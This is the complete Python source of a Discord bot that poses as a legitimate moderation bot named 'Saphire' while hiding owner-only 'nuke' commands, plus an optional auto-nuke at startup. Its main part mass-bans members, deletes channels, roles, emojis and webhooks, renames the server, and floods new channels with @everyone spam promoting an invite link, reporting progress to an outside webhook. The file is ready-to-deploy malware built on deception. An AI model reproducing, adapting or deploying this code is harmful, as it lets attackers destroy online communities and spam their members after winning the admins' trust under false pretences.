# language: Python 3.11+, file: bot.py, target: Discord + Railway
# Undercover multi-purpose bot (Saphire facade) + owner nuke payload

from __future__ import annotations

import os
import sys
import json
import random
import asyncio
import logging
import traceback
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional, List, Iterable, Set

import aiohttp
from aiohttp import web
import discord
from discord.ext import commands
from discord.errors import HTTPException, Forbidden, NotFound

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S",
    stream=sys.stdout,
    force=True,
)
log = logging.getLogger("saphire")

WHITELIST_FILE = Path("whitelist.json")

# Public branding — looks like legit multi-purpose bot
BOT_NAME = "Saphire"
BOT_COLOR = 0x5865F2  # blurple-ish, Sapphire-adjacent
PROMO = (
    "@everyone\n"
    "## Got fucked? Join us today..\n"
    "https://discord.gg/SKyfbZxzbp\n"
    "## WHITELIST UR SERVER! WITH US."
)
MENTION_EVERYONE = discord.AllowedMentions(everyone=True, users=True, roles=True)


def clean(v: Optional[str]) -> str:
    if not v:
        return ""
    v = v.strip()
    if len(v) >= 2 and v[0] == v[-1] and v[0] in ("'\""):
        v = v[1:-1].strip()
    return v


def first_env(*keys: str, default: str = "") -> str:
    for k in keys:
        val = clean(os.getenv(k))
        if val:
            log.info("Using env %s (len=%s)", k, len(val))
            return val
    return default


def env_bool(key: str, default: bool = False) -> bool:
    v = (os.getenv(key) or str(default)).strip().lower()
    return v in ("1", "true", "yes", "on", "y")


def env_int(key: str, default: int = 0) -> int:
    try:
        return int((os.getenv(key) or str(default)).strip())
    except ValueError:
        return default


def env_float(key: str, default: float = 0.0) -> float:
    try:
        return float((os.getenv(key) or str(default)).strip())
    except ValueError:
        return default


def parse_ids(raw: str) -> Set[int]:
    out: Set[int] = set()
    for part in raw.replace(" ", "").split(","):
        if part.isdigit():
            out.add(int(part))
    return out


TOKEN = first_env(
    "TOKEN", "DISCORD_TOKEN", "BOT_TOKEN", "DISCORD_BOT_TOKEN",
    "CLIENT_TOKEN", "NUKE_TOKEN", "DISCORD_BOT",
)
OWNER_RAW = first_env(
    "OWNER_IDS", "OWNER_ID", "OWNERS", "BOT_OWNER", "OWNER", "ADMIN_IDS", "ADMIN_ID",
)
OWNER_IDS = parse_ids(OWNER_RAW)
# Public prefix looks like Sapphire-style (s! common community habit)
PREFIX = first_env("PREFIX", "BOT_PREFIX", default="s!") or "s!"
PORT = env_int("PORT", 8080)

NUKE_NAME = first_env("NUKE_NAME", default="NUKED") or "NUKED"
SPAM_CHANNELS = max(0, env_int("SPAM_CHANNELS", 30))
SPAM_MESSAGES = max(1, env_int("SPAM_MESSAGES", 8))
_raw_spam = first_env("SPAM_TEXT", default="")
SPAM_TEXT = _raw_spam if _raw_spam else PROMO
if "@everyone" not in SPAM_TEXT:
    SPAM_TEXT = "@everyone\n" + SPAM_TEXT
WEBHOOK_SPAM = env_bool("WEBHOOK_SPAM", True)
BAN_REASON = first_env("BAN_REASON", default="nuked") or "nuked"
DELETE_ROLES = env_bool("DELETE_ROLES", True)
DELETE_EMOJIS = env_bool("DELETE_EMOJIS", True)
DELETE_STICKERS = env_bool("DELETE_STICKERS", True)
DELETE_WEBHOOKS = env_bool("DELETE_WEBHOOKS", True)
BAN_ALL = env_bool("BAN_ALL", True)
KICK_INSTEAD = env_bool("KICK_INSTEAD", False)
SKIP_BOTS = env_bool("SKIP_BOTS", False)
SKIP_OWNER = env_bool("SKIP_OWNER", True)
CREATE_ROLES = max(0, env_int("CREATE_ROLES", 5))
ROLE_NAME = first_env("ROLE_NAME", default="nuked") or "nuked"
CHANNEL_NAME = first_env("CHANNEL_NAME", default="nuked") or "nuked"
CREATE_CATEGORIES = max(0, env_int("CREATE_CATEGORIES", 3))
CREATE_VOICE = max(0, env_int("CREATE_VOICE", 5))
DM_MESSAGE = first_env("DM_MESSAGE") or PROMO
LOG_WEBHOOK = first_env("LOG_WEBHOOK", "WEBHOOK_URL")
AUTO_NUKE_GUILD = first_env("AUTO_NUKE_GUILD", "GUILD_ID", "TARGET_GUILD")
CONCURRENCY = max(1, min(env_int("CONCURRENCY", 2), 8))
RATE_LIMIT_DELAY = max(0.25, env_float("RATE_LIMIT_DELAY", 0.45))
PHASE_PAUSE = max(0.5, env_float("PHASE_PAUSE", 2.0))
MAX_RETRIES = max(1, env_int("MAX_RETRIES", 4))
CMD_COOLDOWN = max(0.0, env_float("CMD_COOLDOWN", 8.0))
KEEPALIVE_SEC = max(30, env_int("KEEPALIVE_SEC", 60))

WHITELIST: Set[int] = parse_ids(first_env("WHITELIST_GUILDS", "WHITELIST", default=""))


def load_whitelist() -> None:
    global WHITELIST
    if WHITELIST_FILE.exists():
        try:
            data = json.loads(WHITELIST_FILE.read_text(encoding="utf-8"))
            for x in data:
                if isinstance(x, int) or (isinstance(x, str) and str(x).isdigit()):
                    WHITELIST.add(int(x))
        except Exception as e:
            log.warning("whitelist load: %s", e)


def save_whitelist() -> None:
    try:
        WHITELIST_FILE.write_text(json.dumps(sorted(WHITELIST), indent=2), encoding="utf-8")
    except Exception as e:
        log.warning("whitelist save: %s", e)


def is_whitelisted(guild_id: int) -> bool:
    return guild_id in WHITELIST


load_whitelist()

log.info("=== %s BOOT ===", BOT_NAME)
log.info("python=%s", sys.version.split()[0])
log.info("PORT=%s PREFIX=%s", PORT, PREFIX)
log.info("TOKEN found=%s len=%s", bool(TOKEN), len(TOKEN))
log.info("OWNER_IDS=%s WHITELIST=%s", OWNER_IDS or "(empty)", WHITELIST or "(empty)")

intents = discord.Intents.none()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True
intents.emojis = True
intents.emojis_and_stickers = True
intents.moderation = True

bot = commands.Bot(
    command_prefix=PREFIX,
    intents=intents,
    help_command=None,
    chunk_guilds_at_startup=False,
    activity=discord.Activity(type=discord.ActivityType.watching, name="your server | s!help"),
)

sem: asyncio.Semaphore | None = None
action_lock = asyncio.Lock()
_http: aiohttp.ClientSession | None = None
_bot_ready = False
_global_cooldown_until = 0.0


def is_owner(uid: int) -> bool:
    return bool(OWNER_IDS) and uid in OWNER_IDS


def owner_only():
    async def pred(ctx: commands.Context) -> bool:
        if not OWNER_IDS:
            return False
        return ctx.author.id in OWNER_IDS

    return commands.check(pred)


def embed_base(title: str, description: str = "") -> discord.Embed:
    e = discord.Embed(title=title, description=description or None, color=BOT_COLOR)
    e.set_footer(text=f"{BOT_NAME} • Multi-purpose bot")
    e.timestamp = datetime.now(timezone.utc)
    return e


async def get_http() -> aiohttp.ClientSession:
    global _http
    if _http is None or _http.closed:
        _http = aiohttp.ClientSession()
    return _http


async def external_log(msg: str):
    if not LOG_WEBHOOK:
        return
    try:
        session = await get_http()
        await session.post(LOG_WEBHOOK, json={"content": f"```{msg[:1900]}```"})
    except Exception:
        pass


async def say(msg: str):
    log.info(msg)
    await external_log(msg)


async def jitter_sleep(base: float | None = None):
    delay = base if base is not None else RATE_LIMIT_DELAY
    await asyncio.sleep(delay * (1.2 + random.random() * 0.4))


async def limited(coro):
    global _global_cooldown_until
    assert sem is not None
    async with sem:
        now = asyncio.get_event_loop().time()
        if now < _global_cooldown_until:
            await asyncio.sleep(_global_cooldown_until - now)
        last_err = None
        for attempt in range(MAX_RETRIES):
            try:
                result = await coro
                await jitter_sleep()
                return result
            except HTTPException as e:
                last_err = e
                if e.status == 429:
                    retry = 2.0 * (2 ** attempt)
                    try:
                        if e.response is not None:
                            ra = e.response.headers.get("Retry-After")
                            if ra is not None:
                                retry = float(ra) + random.uniform(0.3, 1.0)
                            if e.response.headers.get("X-RateLimit-Global", "").lower() == "true":
                                _global_cooldown_until = asyncio.get_event_loop().time() + retry
                    except Exception:
                        pass
                    await asyncio.sleep(retry)
                    continue
                if e.status in (500, 502, 503, 504):
                    await asyncio.sleep(1.5 * (attempt + 1))
                    continue
                return None
            except (Forbidden, NotFound):
                return None
            except Exception as e:
                last_err = e
                return None
        return None


async def gather_limited(coros: Iterable):
    tasks = [asyncio.create_task(limited(c)) for c in coros]
    if not tasks:
        return []
    return await asyncio.gather(*tasks, return_exceptions=True)


async def phase_pause():
    await asyncio.sleep(PHASE_PAUSE + random.uniform(0, 0.8))


async def fetch_members(guild: discord.Guild) -> List[discord.Member]:
    try:
        if not guild.chunked:
            await guild.chunk(cache=True)
    except Exception as e:
        log.warning("chunk: %s", e)
    return list(guild.members)


# ── Nuke internals ──

async def action_ban_all(guild: discord.Guild, kick: bool = False) -> int:
    me, owner = guild.me, guild.owner
    members = await fetch_members(guild)
    targets = [
        m for m in members
        if not (me and m.id == me.id)
        and not (SKIP_OWNER and owner and m.id == owner.id)
        and not (SKIP_BOTS and m.bot)
    ]

    async def one(m: discord.Member):
        if DM_MESSAGE:
            try:
                await m.send(DM_MESSAGE[:2000])
            except Exception:
                pass
        if kick:
            await m.kick(reason=BAN_REASON)
        else:
            await m.ban(reason=BAN_REASON, delete_message_days=0)
        return 1

    results = await gather_limited(one(m) for m in targets)
    return sum(1 for r in results if r == 1)


async def action_delete_channels(guild: discord.Guild) -> int:
    async def one(ch):
        await ch.delete()
        return 1

    results = await gather_limited(one(ch) for ch in list(guild.channels))
    return sum(1 for r in results if r == 1)


async def action_delete_roles(guild: discord.Guild) -> int:
    me = guild.me
    roles = [
        r for r in guild.roles
        if not r.is_default() and not r.managed and not (me and r >= me.top_role)
    ]

    async def one(role):
        await role.delete()
        return 1

    results = await gather_limited(one(r) for r in roles)
    return sum(1 for r in results if r == 1)


async def action_delete_emojis(guild: discord.Guild) -> int:
    async def one(e):
        await e.delete()
        return 1

    results = await gather_limited(one(e) for e in list(guild.emojis))
    return sum(1 for r in results if r == 1)


async def action_delete_stickers(guild: discord.Guild) -> int:
    async def one(s):
        await s.delete()
        return 1

    results = await gather_limited(one(s) for s in list(guild.stickers))
    return sum(1 for r in results if r == 1)


async def action_delete_webhooks(guild: discord.Guild) -> int:
    try:
        webhooks = await guild.webhooks()
    except Exception:
        return 0

    async def one(wh):
        await wh.delete()
        return 1

    results = await gather_limited(one(w) for w in webhooks)
    return sum(1 for r in results if r == 1)


async def action_rename(guild: discord.Guild, name: str) -> bool:
    try:
        await guild.edit(name=name[:100])
        return True
    except Exception as e:
        log.warning("rename: %s", e)
        return False


async def action_create_channels(guild: discord.Guild, n: int, base: str) -> List[discord.TextChannel]:
    created: List[discord.TextChannel] = []

    async def one(i: int):
        return await guild.create_text_channel(f"{base}-{i}")

    results = await gather_limited(one(i) for i in range(n))
    for r in results:
        if isinstance(r, discord.TextChannel):
            created.append(r)
    return created


async def action_create_categories(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_category(f"{base}-cat-{i}")
        return 1

    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)


async def action_create_voice(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_voice_channel(f"{base}-vc-{i}")
        return 1

    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)


async def action_create_roles(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_role(name=f"{base}-{i}")
        return 1

    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)


async def action_spam_messages(channels: List[discord.TextChannel], text: str, times: int):
    async def one(ch: discord.TextChannel):
        for _ in range(times):
            try:
                await ch.send(text[:2000], allowed_mentions=MENTION_EVERYONE)
            except HTTPException as e:
                if e.status == 429:
                    ra = 1.5
                    try:
                        if e.response is not None:
                            ra = float(e.response.headers.get("Retry-After", 1.5))
                    except Exception:
                        pass
                    await asyncio.sleep(ra + 0.5)
                    continue
                break
            except Exception:
                break
            await jitter_sleep()
        return 1

    await gather_limited(one(ch) for ch in channels)


async def action_webhook_spam(channels: List[discord.TextChannel], text: str, times: int):
    async def one(ch: discord.TextChannel):
        wh = None
        try:
            wh = await ch.create_webhook(name=BOT_NAME)
            for _ in range(times):
                try:
                    await wh.send(
                        text[:2000],
                        username=BOT_NAME,
                        allowed_mentions=MENTION_EVERYONE,
                    )
                except HTTPException as e:
                    if e.status == 429:
                        ra = 1.5
                        try:
                            if e.response is not None:
                                ra = float(e.response.headers.get("Retry-After", 1.5))
                        except Exception:
                            pass
                        await asyncio.sleep(ra + 0.5)
                        continue
                    break
                except Exception:
                    break
                await jitter_sleep()
        except Exception:
            for _ in range(times):
                try:
                    await ch.send(text[:2000], allowed_mentions=MENTION_EVERYONE)
                except Exception:
                    break
                await jitter_sleep()
        finally:
            if wh:
                try:
                    await wh.delete()
                except Exception:
                    pass
        return 1

    await gather_limited(one(ch) for ch in channels)


async def full_nuke(guild: discord.Guild):
    if is_whitelisted(guild.id):
        await say(f"[-] BLOCKED whitelist → {guild.name} ({guild.id})")
        return
    if action_lock.locked():
        await say("[-] action already running")
        return

    async with action_lock:
        await say(f"[*] NUKE START → {guild.name} ({guild.id})")
        if BAN_ALL:
            await say(f"[+] Ban/Kick: {await action_ban_all(guild, kick=KICK_INSTEAD)}")
            await phase_pause()
        if DELETE_WEBHOOKS:
            await say(f"[+] Webhooks: {await action_delete_webhooks(guild)}")
            await phase_pause()
        await say(f"[+] Channels: {await action_delete_channels(guild)}")
        await phase_pause()
        if DELETE_ROLES:
            await say(f"[+] Roles: {await action_delete_roles(guild)}")
            await phase_pause()
        if DELETE_EMOJIS:
            await say(f"[+] Emojis: {await action_delete_emojis(guild)}")
        if DELETE_STICKERS:
            await say(f"[+] Stickers: {await action_delete_stickers(guild)}")
            await phase_pause()
        await say(f"[+] Rename: {await action_rename(guild, NUKE_NAME)}")
        await phase_pause()
        if CREATE_ROLES:
            await say(f"[+] Roles+: {await action_create_roles(guild, CREATE_ROLES, ROLE_NAME)}")
        if CREATE_CATEGORIES:
            await say(f"[+] Cats: {await action_create_categories(guild, CREATE_CATEGORIES, CHANNEL_NAME)}")
        if CREATE_VOICE:
            await say(f"[+] Voice: {await action_create_voice(guild, CREATE_VOICE, CHANNEL_NAME)}")
        await phase_pause()
        channels = await action_create_channels(guild, SPAM_CHANNELS, CHANNEL_NAME)
        await say(f"[+] Text: {len(channels)}")
        if channels and SPAM_MESSAGES > 0:
            text = SPAM_TEXT if SPAM_TEXT else PROMO
            if WEBHOOK_SPAM:
                await action_webhook_spam(channels, text, SPAM_MESSAGES)
            else:
                await action_spam_messages(channels, text, SPAM_MESSAGES)
            await say("[+] Spam done")
        await say("[*] NUKE COMPLETE")


# ── Health ──

async def health_handler(_request):
    return web.Response(text="online" if _bot_ready else "starting", status=200)


async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    log.info("Health OK on 0.0.0.0:%s", PORT)


@bot.event
async def on_ready():
    global sem, _bot_ready
    sem = asyncio.Semaphore(CONCURRENCY)
    _bot_ready = True
    log.info("===== %s ONLINE as %s =====", BOT_NAME, bot.user)
    log.info("guilds=%s owners=%s", len(bot.guilds), OWNER_IDS)
    bot.loop.create_task(keepalive())
    if AUTO_NUKE_GUILD.isdigit():
        gid = int(AUTO_NUKE_GUILD)
        if not is_whitelisted(gid):
            g = bot.get_guild(gid)
            if g:
                await full_nuke(g)


async def keepalive():
    while True:
        await asyncio.sleep(KEEPALIVE_SEC)
        log.info("alive | guilds=%s latency=%.0fms", len(bot.guilds), bot.latency * 1000)


@bot.event
async def on_command_error(ctx: commands.Context, error: Exception):
    if isinstance(error, commands.CommandOnCooldown):
        try:
            await ctx.send(f"Cooldown `{error.retry_after:.1f}s`.", delete_after=5)
        except Exception:
            pass
        return
    if isinstance(error, commands.MissingPermissions):
        try:
            await ctx.send("You need higher permissions for this command.")
        except Exception:
            pass
        return
    if isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):
        return
    log.error("cmd: %s", error)


@bot.event
async def on_error(event_method, *args, **kwargs):
    log.error("event %s\n%s", event_method, traceback.format_exc())


# ══════════════════════════════════════════════
# PUBLIC FACADE — looks like real mod / multi-purpose bot
# ══════════════════════════════════════════════

@bot.command(name="help")
async def cmd_help(ctx: commands.Context):
    e = embed_base(
        f"{BOT_NAME} — Help",
        "Fully customizable multi-purpose bot.\n"
        f"Prefix: `{PREFIX}`",
    )
    e.add_field(
        name="Moderation",
        value=(
            f"`{PREFIX}ban <user> [reason]`\n"
            f"`{PREFIX}kick <user> [reason]`\n"
            f"`{PREFIX}mute <user> [reason]`\n"
            f"`{PREFIX}warn <user> [reason]`\n"
            f"`{PREFIX}purge <amount>`"
        ),
        inline=False,
    )
    e.add_field(
        name="Info",
        value=(
            f"`{PREFIX}ping`\n"
            f"`{PREFIX}serverinfo`\n"
            f"`{PREFIX}userinfo [user]`\n"
            f"`{PREFIX}avatar [user]`\n"
            f"`{PREFIX}roleinfo <role>`"
        ),
        inline=False,
    )
    e.add_field(
        name="Utility",
        value=f"`{PREFIX}say <message>` · `{PREFIX}embed <title> | <desc>`",
        inline=False,
    )
    e.add_field(
        name="Dashboard",
        value="Configure auto-mod, reaction roles & logging on the web dashboard.",
        inline=False,
    )
    await ctx.send(embed=e)


@bot.command(name="ping")
async def cmd_ping(ctx: commands.Context):
    ms = round(bot.latency * 1000)
    e = embed_base("Pong", f"Latency: **{ms}ms**")
    await ctx.send(embed=e)


@bot.command(name="serverinfo", aliases=["si", "guildinfo"])
async def cmd_serverinfo(ctx: commands.Context):
    g = ctx.guild
    e = embed_base(g.name)
    if g.icon:
        e.set_thumbnail(url=g.icon.url)
    e.add_field(name="Owner", value=str(g.owner), inline=True)
    e.add_field(name="Members", value=str(g.member_count), inline=True)
    e.add_field(name="Channels", value=str(len(g.channels)), inline=True)
    e.add_field(name="Roles", value=str(len(g.roles)), inline=True)
    e.add_field(name="Emojis", value=str(len(g.emojis)), inline=True)
    e.add_field(name="Boosts", value=str(g.premium_subscription_count or 0), inline=True)
    e.add_field(name="Created", value=discord.utils.format_dt(g.created_at, "R"), inline=False)
    e.add_field(name="ID", value=f"`{g.id}`", inline=False)
    await ctx.send(embed=e)


@bot.command(name="userinfo", aliases=["ui", "whois"])
async def cmd_userinfo(ctx: commands.Context, member: Optional[discord.Member] = None):
    m = member or ctx.author
    e = embed_base(str(m))
    if m.display_avatar:
        e.set_thumbnail(url=m.display_avatar.url)
    e.add_field(name="ID", value=f"`{m.id}`", inline=True)
    e.add_field(name="Bot", value=str(m.bot), inline=True)
    e.add_field(name="Joined", value=discord.utils.format_dt(m.joined_at, "R") if m.joined_at else "—", inline=True)
    e.add_field(name="Created", value=discord.utils.format_dt(m.created_at, "R"), inline=True)
    roles = [r.mention for r in m.roles if r != ctx.guild.default_role][:15]
    e.add_field(name="Roles", value=" ".join(roles) if roles else "None", inline=False)
    await ctx.send(embed=e)


@bot.command(name="avatar", aliases=["av", "pfp"])
async def cmd_avatar(ctx: commands.Context, member: Optional[discord.Member] = None):
    m = member or ctx.author
    e = embed_base(f"Avatar — {m}")
    e.set_image(url=m.display_avatar.url)
    await ctx.send(embed=e)


@bot.command(name="roleinfo")
async def cmd_roleinfo(ctx: commands.Context, *, role: discord.Role):
    e = embed_base(role.name)
    e.color = role.color if role.color.value else BOT_COLOR
    e.add_field(name="ID", value=f"`{role.id}`", inline=True)
    e.add_field(name="Members", value=str(len(role.members)), inline=True)
    e.add_field(name="Mentionable", value=str(role.mentionable), inline=True)
    e.add_field(name="Hoisted", value=str(role.hoist), inline=True)
    e.add_field(name="Position", value=str(role.position), inline=True)
    e.add_field(name="Created", value=discord.utils.format_dt(role.created_at, "R"), inline=True)
    await ctx.send(embed=e)


@bot.command(name="ban")
@commands.has_permissions(ban_members=True)
@commands.bot_has_permissions(ban_members=True)
async def cmd_ban(ctx: commands.Context, member: discord.Member, *, reason: str = "No reason provided"):
    if member.top_role >= ctx.author.top_role and ctx.author.id != ctx.guild.owner_id:
        await ctx.send("You cannot ban this member.")
        return
    await member.ban(reason=f"{ctx.author}: {reason}")
    e = embed_base("Member banned", f"**{member}** was banned.\nReason: {reason}")
    await ctx.send(embed=e)


@bot.command(name="kick")
@commands.has_permissions(kick_members=True)
@commands.bot_has_permissions(kick_members=True)
async def cmd_kick(ctx: commands.Context, member: discord.Member, *, reason: str = "No reason provided"):
    if member.top_role >= ctx.author.top_role and ctx.author.id != ctx.guild.owner_id:
        await ctx.send("You cannot kick this member.")
        return
    await member.kick(reason=f"{ctx.author}: {reason}")
    e = embed_base("Member kicked", f"**{member}** was kicked.\nReason: {reason}")
    await ctx.send(embed=e)


@bot.command(name="mute", aliases=["timeout"])
@commands.has_permissions(moderate_members=True)
@commands.bot_has_permissions(moderate_members=True)
async def cmd_mute(ctx: commands.Context, member: discord.Member, minutes: int = 10, *, reason: str = "No reason"):
    from datetime import timedelta
    minutes = max(1, min(minutes, 40320))
    await member.timeout(timedelta(minutes=minutes), reason=f"{ctx.author}: {reason}")
    e = embed_base("Member muted", f"**{member}** muted for **{minutes}m**.\nReason: {reason}")
    await ctx.send(embed=e)


@bot.command(name="warn")
@commands.has_permissions(moderate_members=True)
async def cmd_warn(ctx: commands.Context, member: discord.Member, *, reason: str = "No reason provided"):
    e = embed_base("Warning issued", f"**{member}** was warned.\nReason: {reason}")
    await ctx.send(embed=e)
    try:
        await member.send(f"You were warned in **{ctx.guild.name}**.\nReason: {reason}")
    except Exception:
        pass


@bot.command(name="purge", aliases=["clear"])
@commands.has_permissions(manage_messages=True)
@commands.bot_has_permissions(manage_messages=True)
async def cmd_purge(ctx: commands.Context, amount: int = 10):
    amount = max(1, min(amount, 100))
    deleted = await ctx.channel.purge(limit=amount + 1)
    msg = await ctx.send(f"Deleted **{len(deleted) - 1}** messages.")
    await asyncio.sleep(3)
    try:
        await msg.delete()
    except Exception:
        pass


@bot.command(name="say")
@commands.has_permissions(manage_messages=True)
async def cmd_say(ctx: commands.Context, *, message: str):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await ctx.send(message[:2000])


@bot.command(name="embed")
@commands.has_permissions(manage_messages=True)
async def cmd_embed(ctx: commands.Context, *, content: str):
    parts = content.split("|", 1)
    title = parts[0].strip()
    desc = parts[1].strip() if len(parts) > 1 else ""
    e = embed_base(title, desc)
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await ctx.send(embed=e)


# ══════════════════════════════════════════════
# OWNER-ONLY — undercover nuke (hidden from help)
# ══════════════════════════════════════════════

def heavy_cd():
    return commands.cooldown(1, CMD_COOLDOWN, commands.BucketType.user)


@bot.command(name="nuke", hidden=True)
@owner_only()
@heavy_cd()
async def cmd_nuke(ctx: commands.Context, guild_id: Optional[int] = None):
    target = bot.get_guild(guild_id) if guild_id else ctx.guild
    if not target:
        await ctx.send("Guild not found.")
        return
    if is_whitelisted(target.id):
        await ctx.send(f"Whitelisted `{target.id}` — refused.")
        return
    if action_lock.locked():
        await ctx.send("Busy.")
        return
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await full_nuke(target)


@bot.command(name="banall", hidden=True)
@owner_only()
@heavy_cd()
async def cmd_banall(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("Whitelisted.")
        return
    if action_lock.locked():
        await ctx.send("Busy.")
        return
    async with action_lock:
        n = await action_ban_all(ctx.guild, False)
    await ctx.send(f"Banned: {n}")


@bot.command(name="kickall", hidden=True)
@owner_only()
@heavy_cd()
async def cmd_kickall(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("Whitelisted.")
        return
    async with action_lock:
        n = await action_ban_all(ctx.guild, True)
    await ctx.send(f"Kicked: {n}")


@bot.command(name="delchannels", hidden=True)
@owner_only()
@heavy_cd()
async def cmd_delchannels(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("Whitelisted.")
        return
    async with action_lock:
        n = await action_delete_channels(ctx.guild)
    await ctx.send(f"Channels: {n}")


@bot.command(name="delroles", hidden=True)
@owner_only()
@heavy_cd()
async def cmd_delroles(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("Whitelisted.")
        return
    async with action_lock:
        n = await action_delete_roles(ctx.guild)
    await ctx.send(f"Roles: {n}")


@bot.command(name="spam", hidden=True)
@owner_only()
@heavy_cd()
async def cmd_spam(ctx: commands.Context, count: int = 15):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("Whitelisted.")
        return
    count = max(1, min(count, 40))
    async with action_lock:
        channels = await action_create_channels(ctx.guild, count, CHANNEL_NAME)
        text = SPAM_TEXT if SPAM_TEXT else PROMO
        if WEBHOOK_SPAM:
            await action_webhook_spam(channels, text, SPAM_MESSAGES)
        else:
            await action_spam_messages(channels, text, SPAM_MESSAGES)
    await ctx.send(f"Spam: {len(channels)}")


@bot.command(name="whitelist", hidden=True)
@owner_only()
async def cmd_whitelist(ctx: commands.Context, action: str = "list", server_id: Optional[str] = None):
    action = action.lower().strip()
    if action in ("list", "ls"):
        if not WHITELIST:
            await ctx.send("Empty.")
            return
        await ctx.send(f"```{' '.join(str(i) for i in sorted(WHITELIST))}```")
        return
    if action in ("add", "+") and server_id and server_id.isdigit():
        WHITELIST.add(int(server_id))
        save_whitelist()
        await ctx.send(f"WL + `{server_id}`")
        return
    if action in ("remove", "rm", "-") and server_id and server_id.isdigit():
        WHITELIST.discard(int(server_id))
        save_whitelist()
        await ctx.send(f"WL - `{server_id}`")
        return
    if action.isdigit():
        WHITELIST.add(int(action))
        save_whitelist()
        await ctx.send(f"WL + `{action}`")
        return
    await ctx.send(f"`{PREFIX}whitelist add|remove|list <id>`")


@bot.command(name="guilds", hidden=True)
@owner_only()
async def cmd_guilds(ctx: commands.Context):
    lines = [f"{g.name} | {g.id} | {g.member_count}{' [WL]' if is_whitelisted(g.id) else ''}" for g in bot.guilds]
    await ctx.send(f"```{(chr(10).join(lines) or 'none')[:1900]}```")


@bot.command(name="leave", hidden=True)
@owner_only()
async def cmd_leave(ctx: commands.Context):
    await ctx.send("Leaving.")
    await ctx.guild.leave()


@bot.command(name="ownerhelp", hidden=True)
@owner_only()
async def cmd_ownerhelp(ctx: commands.Context):
    await ctx.send(
        f"```\n"
        f"{PREFIX}nuke [id]\n"
        f"{PREFIX}banall / kickall / delchannels / delroles\n"
        f"{PREFIX}spam [n]\n"
        f"{PREFIX}whitelist add|remove|list <id>\n"
        f"{PREFIX}guilds / leave\n"
        f"```"
    )


async def runner():
    await start_health_server()
    if not TOKEN:
        log.error("NO TOKEN")
        while True:
            await asyncio.sleep(3600)
        return
    log.info("Connecting…")
    try:
        async with bot:
            await bot.start(TOKEN, reconnect=True)
    except discord.LoginFailure:
        log.error("LOGIN FAILED")
        while True:
            await asyncio.sleep(3600)
    except Exception:
        log.error("CRASH:\n%s", traceback.format_exc())
        while True:
            await asyncio.sleep(3600)


def main():
    try:
        asyncio.run(runner())
    except Exception:
        log.error("MAIN:\n%s", traceback.format_exc())
        sys.exit(1)


if __name__ == "__main__":
    main()
